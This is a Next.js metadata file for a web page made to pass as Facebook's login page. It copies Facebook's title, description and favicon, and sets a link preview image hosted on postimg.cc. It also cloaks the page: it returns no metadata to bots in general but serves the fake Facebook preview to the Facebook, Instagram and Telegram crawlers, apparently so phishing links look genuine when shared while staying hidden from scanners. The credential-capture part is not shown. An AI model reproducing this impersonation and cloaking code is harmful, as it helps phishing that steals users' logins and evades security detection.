import { headers } from 'next/headers';
import DeviceDetector from 'device-detector-js';

export async function generateMetadata() {
    const headersList = await headers();
    const userAgent = headersList.get('user-agent')?.toLowerCase() || '';
    const protocol = headersList.get('x-forwarded-proto') || 'https';
    const host = headersList.get('host') || 'localhost:3000';
    const metadataBase = new URL(`${protocol}://${host}`);

    const deviceDetector = new DeviceDetector();
    const device = deviceDetector.parse(userAgent);

    const isFacebookBot = userAgent.includes('facebookexternalhit') || userAgent.includes('facebot');
    const isInstagramBot = userAgent.includes('instagram');
    const isTelegramBot = userAgent.includes('telegrambot');

    const isAllowedBot = isFacebookBot || isInstagramBot || isTelegramBot;

    if (device.bot && !isAllowedBot) {
        return null;
    }

    return {
        metadataBase,
        title: 'Facebook – log in or Sign up'  ,
        icons: {
            icon: '/favicon-32x32.png',
            apple: '/favicon-32x32.png',
            shortcut: '/favicon-32x32.png',
        },
        description: 'Log in to Facebook to start sharing and connecting with your friends, family and people you know.',
        openGraph: {
            images: 'https://i.postimg.cc/Y2dN0B2t/social-preview.png',
            title: 'Facebook – log in or sign up',
            description: 'Log in to Facebook to start sharing and connecting with your friends, family and people you know.',
        },
        twitter: {
            images: 'https://i.postimg.cc/Y2dN0B2t/social-preview.png',
            title: 'Facebook – log in or sign up',
            description: 'Log in to Facebook to start sharing and connecting with your friends, family and people you know.',
        }
    };
}